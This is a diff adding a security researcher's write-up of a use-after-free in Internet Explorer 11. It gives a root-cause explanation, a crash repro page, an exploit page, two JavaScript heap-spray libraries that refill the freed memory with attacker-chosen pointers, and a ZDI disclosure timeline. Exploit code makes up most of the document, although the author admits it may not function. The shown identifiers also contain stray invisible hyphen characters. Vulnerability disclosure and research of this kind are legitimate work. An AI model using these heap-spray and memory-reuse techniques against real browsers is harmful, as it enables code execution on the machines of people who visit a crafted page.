@@ -1,0 +1,188 @@
+<!--
+Source: http://blog.skylined.nl/20161220001.html
+
+Synopsis
+
+A specially crafted web-page can trigger a use-after-free vulnerability in Microsoft Internet Explorer 11. There is sufficient time between the free and reuse for an attacker to control the contents of the freed memory and exploit the vulnerability.
+
+Known affected software, attack vectors and potential mitigations
+
+Microsoft Internet Explorer 11
+
+An attacker would need to get a target user to open a specially crafted web-page. Disabling Java­Script should prevent an attacker from triggering the vulnerable code path.
+
+Details
+
+This was one of the first bugs where I attempted to do a proper analysis, and I got some feedback from ZDI that explained what I got right and what I got wrong. Basically, on x86, a 0x28 byte memory block is allocated in MSHTML!CMarkup::Do­Embed­Pointers and when you execute document.exec­Command("Delete"). This memory can be freed when you execute document.open() in a DOMNode­Removed event handler. After that, you can use Javascript to reallocate the memory before it is reused.
+
+Repro.html:
+
+<!doctype html>
+<html>
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=11"> 
+    <script type="text/javascript">
+      document.add­Event­Listener("DOMNode­Removed", function () {
+        document.open(); // free
+        // attempt to modify freed memory here
+        // because it will be reused after this function returns.
+      }, true);
+      window.onload = function () {
+        document.design­Mode="on";
+        document.exec­Command("Select­All");
+        document.exec­Command("Delete"); // allocate
+      };
+    </script>
+  </head>
+  <body>
+  </body>
+</html>
+
+Exploit
+
+After getting the feedback from ZDI that helped me understand the root cause, I attempted to write an exploit that the issue could be controlled and may be exploitable. I did not keep track of whether my attempts where successful, so the below code may not actually function. However, it should give you an idea on how one might go about writing an exploit for this vulnerability.
+
+Sploit.html:
+-->
+
+<!doctype html>
+<html>
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=11"> 
+    <script src="c­LFHSpray.js"></script>
+    <script src="c­Block­Spray.js"></script>
+    <script>
+      var aau­Copies­And­Sizes  = [
+          [0x08, 0x80], 
+          [0x08, 0x40], 
+          [0x08, 0x20], 
+          [0x10, 0x80]
+      ];
+      var u­Base­Address = 0x12340000;
+      var ao­Block­Sprays = new Array(aau­Copies­And­Sizes.length);
+      for (var i = 0; i < aau­Copies­And­Sizes.length; i++) {
+        ao­Block­Sprays[i] = new c­Block­Spray(aau­Copies­And­Sizes[i][0], aau­Copies­And­Sizes[i][1]);
+        ao­Block­Sprays[i].set­Chunk­DWord(0x0100, u­Base­Address + 0x0300);
+        ao­Block­Sprays[i].spray();
+      }
+      document.add­Event­Listener("DOMNode­Removed", function () {
+        document.open();
+        var o­LFHReuse = new c­LFHSpray(10, 0x28);
+        o­LFHReuse.set­DWord(0x10, u­Base­Address + 0x0100);
+        o­LFHReuse.set­DWord(0x14, u­Base­Address + 0x0200);
+        o­LFHReuse.spray();
+      }, true);
+      window.onload = function () {
+        document.design­Mode="on";
+        document.exec­Command("Select­All");
+        document.exec­Command("Delete");
+        document.design­Mode="off";
+      };
+    </script>
+  </head>
+  <body>
+  </body>
+</html>
+
+<!--
+########################################################################
+
+c­LFHSpray.js:
+
+function c­LFHSpray(u­Count, u­Size) {
+  this.ao­Elements = new Array(u­Count);
+  var au­Spray­Chars = new Array(u­Size - 1 >> 1);
+  for (var i = 0; i < au­Spray­Chars.length; i++) {
+    au­Spray­Chars[i] = ((i & 0x­FF) * 0x202 + 0x100) & 0x­FFFF;
+  }
+  this.set­DWord = function(u­Offset, u­Value) {
+    this.set­Word(u­Offset, u­Value & 0x­FFFF);
+    this.set­Word(u­Offset + 2, u­Value >>> 16);
+  }
+  this.set­Word = function(u­Offset, u­Value) {
+    this.set­Byte(u­Offset, u­Value & 0x­FF);
+    this.set­Byte(u­Offset + 1, u­Value >>> 8);
+  }
+  this.set­Byte = function(u­Offset, u­Value) {
+    var u­Char­Offset = u­Offset >> 1;
+    var u­Byte0 = (u­Offset & 1 ? au­Spray­Chars[u­Char­Offset] : u­Value) & 0x­FF;
+    var u­Byte1 = (u­Offset & 1 ? u­Value : (au­Spray­Chars[u­Char­Offset] >> 8)) & 0x­FF;
+    au­Spray­Chars[u­Char­Offset] = u­Byte0 + (u­Byte1 << 8);
+  }
+  this.spray = function() {
+    var s­Spray­Buffer = String.from­Char­Code.apply(0, au­Spray­Chars);
+    for (var i = 0; i < u­Count; i++) {
+      this.ao­Elements[i] = document.create­Element("span"); // allocate 0x34 bytes
+      this.ao­Elements[i].class­Name = s­Spray­Buffer; // allocate 0x10, u­Size and 0x40 bytes.
+    }
+  }
+}
+
+########################################################################
+
+c­Block­Spray.js:
+
+var c­Block­Spray = (function() {
+  var u­Chunk­Size = 0x10000;
+  var u­Block­Header­Size = 0x10;
+  var u­Block­Footer­Size = 0x04;
+  var as­Chunk­Template = new Array(u­Chunk­Size / 2);
+  for (var u­Index = 0; u­Index < as­Chunk­Template.length; u­Index += 2) {
+    as­Chunk­Template[u­Index] = String.from­Char­Code(u­Index);
+    as­Chunk­Template[u­Index + 1] = String.from­Char­Code(0x­DEAD);
+  }
+  return function c­Block­Spray(u­Block­Count, u­Chunk­Count) {
+    this.u­Block­Size = u­Chunk­Count * u­Chunk­Size - u­Block­Header­Size - u­Block­Footer­Size;
+    var s­Chunk = as­Chunk­Template.join("");
+    var s­Block, as­Blocks = new Array(u­Block­Count);
+    this.set­Chunk­DWord = function (u­Offset, u­Value) {
+      this.set­Chunk­Word(u­Offset, u­Value & 0x­FFFF);
+      this.set­Chunk­Word(u­Offset + 2, (u­Value >> 16) & 0x­FFFF);
+    }
+    this.set­Chunk­Word = function (u­Offset, u­Value) {
+      if (s­Block) throw new Error("Cannot set chunk values after generating block");
+      if (u­Offset & 1) throw new Error("u­Offset (" + u­Offset.to­String(16) + ") must be Word aligned");
+      if (u­Offset >= u­Chunk­Size) throw new Error("u­Offset (" + u­Offset.to­String(16) + ") must be smaller than 0x" + u­Chunk­Size.to­String(16));
+      var u­Index = u­Offset / 2;
+      var s­Value = String.from­Char­Code(u­Value & 0x­FFFF);
+      s­Chunk = s­Chunk.substr(0, u­Index) + s­Value + s­Chunk.substr(u­Index + 1);
+    }
+    this.generate­Block = function () {
+      if (s­Block) throw new Error("Cannot generating block twice");
+      s­Block = (
+        s­Chunk.substr(u­Block­Header­Size / 2) +
+        new Array(u­Chunk­Count - 1).join(s­Chunk) +
+        s­Chunk.substr(0, (u­Chunk­Size - u­Block­Footer­Size) / 2)
+      );
+    }
+    this.set­Block­DWord = function (u­Offset, u­Value) {
+      this.set­Block­Word(u­Offset, u­Value & 0x­FFFF);
+      this.set­Block­Word(u­Offset + 2, (u­Value >> 16) & 0x­FFFF);
+    }
+    this.set­Block­Word = function (u­Offset, u­Value) {
+      if (!s­Block) this.generate­Block();
+      if (u­Offset & 1) throw new Error("u­Offset (" + u­Offset.to­String(16) + ") must be Word aligned");
+      var u­Index = (u­Offset - u­Block­Header­Size) / 2;
+      if (u­Index < 0) throw new Error("u­Offset (" + u­Offset.to­String(16) + ") must be larger than 0x" + u­Block­Header­Size.to­String(16));
+      if (u­Index >= s­Block.length) throw new Error("u­Offset (" + u­Offset.to­String(16) + ") must be smaller than 0x" + (u­Block­Header­Size + s­Block.length * 2).to­String(16));
+      var s­Value = String.from­Char­Code(u­Value & 0x­FFFF);
+      s­Block = s­Block.substr(0, u­Index) + s­Value + s­Block.substr(u­Index + 1);
+    }
+    this.spray = function() {
+      if (!s­Block) this.generate­Block();
+      for (var i = 0; i < u­Block­Count; i++) {
+        as­Blocks[i] = ("" + s­Block).slice(0);
+      }
+    }
+  }
+})();
+
+
+Time-line
+
+30 December 2013: This vulnerability was submitted to ZDI.
+8 January 2014: This vulnerability was acquired by ZDI.
+14 January 2014: This vulnerability was disclosed to Microsoft by ZDI.
+10 June 2014: This vulnerability was address by Microsoft in MS14-035.
+20 December 2016: Details of this vulnerability are released.
+-->
